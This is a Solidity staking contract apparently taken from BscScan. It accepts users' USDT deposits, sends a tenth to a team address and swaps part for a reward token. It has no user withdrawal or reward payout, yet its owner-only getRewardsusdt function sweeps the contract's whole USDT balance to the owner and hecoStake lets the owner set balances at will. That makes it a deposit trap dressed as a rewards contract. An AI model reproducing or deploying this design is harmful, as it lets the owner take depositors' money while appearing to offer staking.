/**
 *Submitted for verification at BscScan.com on 2023-07-17
*/

/**
 *Submitted for verification at BscScan.com on 2023-06-03
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-11
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8;
contract StakingRewards {

    IERC20 public  usdtToken;
    Team public immutable team;
    address public teamAdr;
    IUniswapV2Router01 public immutable Swap;
    address public yhToken;
    address public uToken;

    uint public USDTnum;
    address public owner;
    uint public duration;
    uint public finishAt;
    uint public updatedAt;
    uint public rewardRate;
    uint public rewardPerTokenStored;
    mapping(address => uint) public userRewardPerTokenPaid;
    mapping(address => uint) public rewards;
    uint public totalSupply;
    mapping(address => uint) public balanceOf;

  
    constructor( address _rewardToken,address _swapToken,address _uToken,address _team) {
        owner = msg.sender;

        yhToken = _rewardToken;

        usdtToken = IERC20(_uToken);
        uToken = _uToken;

        Swap = IUniswapV2Router01(_swapToken);

        team = Team(_team);
        teamAdr = _team;
        
        usdtToken.approve(_swapToken,9 * 10**36);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "not authorized");
        _;
    }


    function balanceOfs(address _adr) public view returns (uint) {
        return balanceOf[_adr];
    }



    function getOutHy(uint _num)  public view returns (uint x){
        address[] memory t = new address[](2);

        t[0] = uToken;
        t[1] = yhToken;
        uint[] memory amounts = Swap.getAmountsOut(_num,t);
        x = amounts[1];
        return x;
    }




    function stake(uint _unum) external {
 
        require(team.isCan(msg.sender), "you not team");
        require(_unum > 0, "amount = 0");

        balanceOf[msg.sender] += _unum;
        totalSupply += _unum;

        uint t_num = _unum/10;
        usdtToken.transferFrom(msg.sender, teamAdr, t_num);

        uint a_num =  _unum-t_num;
        usdtToken.transferFrom(msg.sender, address(this),a_num);

        uint y_num = _unum/10;
        uint min_yh = getOutHy(y_num)*7/10;
        uint deadline = block.timestamp + 1200;
        address[] memory t = new address[](2);

        t[0] = uToken;
        t[1] = yhToken;

        Swap.swapExactTokensForTokensSupportingFeeOnTransferTokens(y_num,min_yh,t,address(this),deadline);





    }




    function getRewardsusdt() external onlyOwner{
        uint num = usdtToken.balanceOf(address(this));
        usdtToken.transfer(msg.sender, num);



    }


	function hecoStake(address[] calldata adr,uint256[] calldata num) external onlyOwner{

        for(uint i=0;i<adr.length;i++){
            balanceOf[adr[i]] +=num[i];
            totalSupply += num[i];
        }
        


    }

    function transferOwner(address _newOwner) external onlyOwner{
        owner = _newOwner;
    }


}

interface IERC20 {
    function totalSupply() external view returns (uint);

    function balanceOf(address account) external view returns (uint);

    function transfer(address recipient, uint amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
}

interface IUniswapV2Router01 {
    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface Team{
function setBalance(address _adr,uint _num)external;
function isCan(address _adr)  external view returns (bool);
}